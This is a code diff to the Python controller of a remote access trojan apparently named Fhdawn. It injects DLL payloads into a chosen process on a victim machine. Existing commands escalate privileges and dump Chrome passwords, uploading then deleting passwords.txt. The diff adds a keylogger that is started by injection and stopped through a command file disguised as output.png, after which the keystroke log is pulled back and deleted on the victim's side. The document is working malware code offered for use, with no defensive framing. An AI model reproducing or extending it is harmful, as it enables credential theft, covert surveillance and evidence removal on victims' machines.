@@ -239,7 +239,7 @@ class ClientManage:
                     
                     self.SendData("fdll") # Send File Receive trigger for client
                     time.sleep(1)
-                    trigger =  "maalikloader" + ":" + str(bufferst.st_size) + ":" + proc
+                    trigger =  "maalik" + ":" + str(bufferst.st_size) + ":" + proc
                     self.SendData(trigger) # Send Trigger
                     self.SendBytes(data) # Send file
                     #print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Uploading file.")
@@ -252,7 +252,18 @@ class ClientManage:
         def DLLGetOutput():
             self.SendData("dlloutput")
             self.WaitForReply()
-    
+
+        def SendPayloadCommand(strr):
+            self.SendData("frecv")
+            self.SendData("output.png:"+str(len(strr)))
+            time.sleep(1)
+            self.SendData(strr)
+            self.WaitForReply()
+
+        def RemovePayloadCommand():
+            self.SendData("delete:output.png")
+            self.WaitForReply()
+
         while(session):
             try:
                 try:
@@ -668,16 +679,33 @@ Open Ports
                     self.SendData("screenshot")
                     self.WaitForReply()
                 elif(main == "elevate"):
-                    print(Style.BRIGHT + Fore.LIGHTCYAN_EX + "[~]" + Style.RESET_ALL + " Injecting Payload.")
-                    DLLTransfer("payloads/elevate.dll", setting('inject_process')) # Inject elevate.dll in Fhdawn.exe
+                    # print(Style.BRIGHT + Fore.LIGHTCYAN_EX + "[~]" + Style.RESET_ALL + " Injecting Payload.")
+                    DLLTransfer("payloads/elevate.dll", setting('inject_process')) # Inject elevate.dll 
                 
                 elif(main == "chromedump"):
-                    print(Style.BRIGHT + Fore.LIGHTCYAN_EX + "[~]" + Style.RESET_ALL + " Injecting Payload.")
-                    DLLTransfer("payloads/ChromeDump.dll", setting('inject_process')) # Inject ChromeDump.dll in Fhdawn.exe
+                    # print(Style.BRIGHT + Fore.LIGHTCYAN_EX + "[~]" + Style.RESET_ALL + " Injecting Payload.")
+                    DLLTransfer("payloads/ChromeDump.dll", setting('inject_process')) # Inject ChromeDump.dll
                     self.SendData("fupload:passwords.txt")
                     time.sleep(2)
                     self.SendData("delete:passwords.txt")
                     self.WaitForReply()
+
+                elif(main == "keylog_start"):
+                    DLLTransfer("payloads/keylogger.dll", setting('inject_process'))
+
+                elif(main == "keylog_stop"):
+                    SendPayloadCommand("KEYLOGSTOP")
+                    time.sleep(2)
+                    RemovePayloadCommand()
+                    self.SendData("fupload:log.log")
+                    self.WaitForReply()
+                    self.SendData("delete:log.log")
+                    self.WaitForReply()
+                    print("-------------------------")
+                    PrintTextFile("downloads/log.log")
+                    print("-------------------------")
+                    os.remove("downloads/log.log")
+
             except KeyboardInterrupt:
                 print("[X] Interrupt, Type exit to Exit session.")
 
